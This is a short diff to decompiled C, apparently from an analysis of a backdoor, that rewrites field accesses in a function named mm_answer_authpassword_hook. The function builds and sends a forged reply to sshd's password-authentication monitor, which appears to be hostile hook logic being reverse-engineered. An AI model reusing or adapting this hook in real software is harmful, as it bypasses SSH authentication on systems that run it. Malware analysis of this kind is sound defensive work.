@@ -28,10 +28,10 @@ int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
   undefined1 uStack_d;
   undefined4 uStack_c;
   
-  libc_imports._0_4_ = 0;
+  *(uint *)&libc_imports = 0;
   funcs = *(libc_imports_t **)(global_ctx + 0x10);
   lVar1 = *(long *)(global_ctx + 0x20);
-  libc_imports._4_4_ = 0;
+  *(uint *)((u8 *)&libc_imports + 4) = 0;
   uStack_d = 0;
   uStack_c = 0;
   if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
@@ -46,8 +46,8 @@ int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
        (buffer = *(libc_imports_t ***)(lVar1 + 0x98), buffer == (libc_imports_t **)0x0)) {
       buffer = &libc_imports;
       uStack_d = 1;
-      libc_imports._4_4_ = *(uint *)(lVar1 + 0x40) & 0xff;
-      libc_imports._0_4_ = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
+      *(uint *)((u8 *)&libc_imports + 4) = *(uint *)(lVar1 + 0x40) & 0xff;
+      *(uint *)&libc_imports = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
       count = (ulong)((uint)libc_imports >> 0x18) + 4;
     }
     fd_write(sock,buffer,count,funcs);
